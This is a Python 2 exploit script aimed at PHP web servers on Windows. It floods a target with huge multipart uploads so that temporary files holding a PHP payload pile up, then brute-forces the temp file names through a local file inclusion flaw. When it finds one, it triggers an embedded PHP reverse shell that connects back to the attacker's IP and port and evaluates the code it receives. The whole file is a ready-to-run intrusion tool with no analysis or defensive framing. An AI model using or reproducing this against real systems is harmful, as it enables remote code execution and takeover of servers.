from urllib2 import HTTPError
import os
import traceback
import socket
import time
import urllib, urllib2, cookielib
import webbrowser
import tempfile
import time
import sys
import progressbar
from progress.bar import IncrementalBar
import random
import socket
import time
import traceback

def help():
	print 'Usage: python ' + sys.argv[0] + ' [your ip] [your port] [server ip] [someone php file] [php file with lfi] \nExample: python ' + sys.argv[0] + ' 192.168.0.100 4444 192.168.0.1 index.php lfi.php?path'
	exit(0)

def gen_packet(shell, host, indexphp):
	bad = 'POST /' + indexphp + ' HTTP/1.1\r\n'
	bad += 'Host: ' + host + '\r\n'
	bad += 'User-Agent: Mozila/5.0\r\n'
	bad += 'Accept: */*\r\n'
	bad += 'Content-Type: multipart/form-data; boundary=---------------------------32917364219558108233580962733\r\n'
	bad += 'Connection: keep-alive\r\n'
	bad += 'Content-Length: 8122000\r\n'
	bad += 'Origin: http://' + 'A' * 3084 + '\r\n'
	for i in range(1,93,1):
		bad += 'AdvancedHeaderName' + str(i) + ':' + 'A' *  3084 + '\r\n'
	bad += 'Referer: http://' + 'A' * 3084 + '\r\n\r\n'
	for i in range(1,129,1):
		bad += '-----------------------------32917364219558108233580962733\r\n'
		bad += 'Content-Disposition: form-data; name="user_file_name' + str(i) + '"; filename="' + str(i) + 'A' * 6144 + '.php"\r\n'
		bad += 'Content-Type: application/x-php\r\n\r\n'
		bad += shell + '\r\n'
	return bad

def send_packet(host,shell,indexphp,lfiphp):
	global gen_packet
	test = gen_packet(shell, host, indexphp)
	try:
		sock1 = socket.socket()
		sock1.connect((host, 80))
		sock1.send(test.encode())
	except socket.error:
		print '\033[31;1m[!] Web server not respond\033[0m'
		exit(0)
	print '[*] Sending bad packets'
	try:
		sock2 = socket.socket()
		sock2.connect((host, 80))
		sock2.send(test.encode())
		sock3 = socket.socket()
		sock3.connect((host, 80))
		sock3.send(test.encode())
		sock4 = socket.socket()
		sock4.connect((host, 80))
		sock4.send(test.encode())
		sock5 = socket.socket()
		sock5.connect((host, 80))
		sock5.send(test.encode())
		sock6 = socket.socket()
		sock6.connect((host, 80))
		sock6.send(test.encode())
		sock7 = socket.socket()
		sock7.connect((host, 80))
		sock7.send(test.encode())
		sock8 = socket.socket()
		sock8.connect((host, 80))
		sock8.send(test.encode())
		sock9 = socket.socket()
		sock9.connect((host, 80))
		sock9.send(test.encode())
		sock10 = socket.socket()
		sock10.connect((host, 80))
		sock10.send(test.encode())
		sock11 = socket.socket()
		sock11.connect((host, 80))
		sock11.send(test.encode())
		sock12 = socket.socket()
		sock12.connect((host, 80))
		sock12.send(test.encode())
		sock13 = socket.socket()
		sock13.connect((host, 80))
		sock13.send(test.encode())
		sock14 = socket.socket()
		sock14.connect((host, 80))
		sock14.send(test.encode())
		sock15 = socket.socket()
		sock15.connect((host, 80))
		sock15.send(test.encode())
		sock16 = socket.socket()
		sock16.connect((host, 80))
		sock16.send(test.encode())
		sock17 = socket.socket()
		sock17.connect((host, 80))
		sock17.send(test.encode())
		sock18 = socket.socket()
		sock18.connect((host, 80))
		sock18.send(test.encode())
		sock19 = socket.socket()
		sock19.connect((host, 80))
		sock19.send(test.encode())
		sock20 = socket.socket()
		sock20.connect((host, 80))
		sock20.send(test.encode())
		sock21 = socket.socket()
		sock21.connect((host, 80))
		sock21.send(test.encode())
		sock22 = socket.socket()
		sock22.connect((host, 80))
		sock22.send(test.encode())
		sock23 = socket.socket()
		sock23.connect((host, 80))
		sock23.send(test.encode())
		sock24 = socket.socket()
		sock24.connect((host, 80))
		sock24.send(test.encode())
		sock25 = socket.socket()
		sock25.connect((host, 80))
		sock25.send(test.encode())
		sock26 = socket.socket()
		sock26.connect((host, 80))
		sock26.send(test.encode())
		sock27 = socket.socket()
		sock27.connect((host, 80))
		sock27.send(test.encode())
		sock28 = socket.socket()
		sock28.connect((host, 80))
		sock28.send(test.encode())
		sock29 = socket.socket()
		sock29.connect((host, 80))
		sock29.send(test.encode())
		sock30 = socket.socket()
		sock30.connect((host, 80))
		sock30.send(test.encode())
        except socket.error:
                print '\033[31;1m[!] Web server not respond\033[0m'
                exit(0)
	x_1=0
	x_2=0
	x_3=0
	x_4=0
	alpth = [0,1,2,3,4,6,7,8,9,10,11,12,13,14,15]
	c=0
	cf=50625
	check=1
	php=[]
	print '[*] Starting brute force'
	while c!=cf:
		rand = ( str('{:x}'.format(alpth[random.randint(0, 14)]).title()) + str('{:x}'.format(alpth[random.randint(0, 14)]).title()) +  str('{:x}'.format(alpth[random.randint(0, 14)]).title()) + str('{:x}'.format(alpth[random.randint(0, 14)]).title()) )
		if php.count(rand)>0:
			check=1
		else:
			check=0
			php.append(rand)
		url = ('http://' + host + '/' + lfiphp + '=C:\Windows\Temp\php' + rand + '.tmp')
	        req = urllib2.Request(url)
		try:
		        resp = urllib2.urlopen(req)
		except KeyboardInterrupt:
			exit(0)
		except HTTPError:
			print '\033[31;1m[!] Error on opening address: http://' + host + '/' + lfiphp + '=index.php\033[0m'
			exit(0)
		except:
			print ('\033[31;1m[!] Unknow error\033[0m')
			print (traceback.format_exc())
		else:
		        content = resp.read().split('\n')
			if  content[0] == 'Found it!':
		                print ("\033[32;1m[!] Found link. It's a C:\Windows\Temp\php" + rand + ".tmp\033[0m")
				print '[*] Starting shell'
				url = ('http://' + host + '/' + lfiphp + '=C:\Windows\Temp\php' + rand + '.tmp&shell=true')
				req = urllib2.Request(url)
				resp = urllib2.urlopen(req)
				exit(0)
			c+=1
			check=1

if __name__ == '__main__':
	if len(sys.argv)!=6:
		help()
	else:
		ip=sys.argv[1]
		port=sys.argv[2]
		shell = '''<?php echo 'Found it!'; if (isset($_GET['shell'])) { error_reporting(0); $ip = "''' + ip + '''"; $port = ''' + port + '''; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die(); }?>'''
		host=sys.argv[3]
		indexphp = sys.argv[4]
		lfiphp = sys.argv[5]
		if ip.isdigit() == True or port.isdigit() == False:
			help()
		try:
			send_packet(host,shell,indexphp,lfiphp)
		except KeyboardInterrupt:
			print '\nExit...'
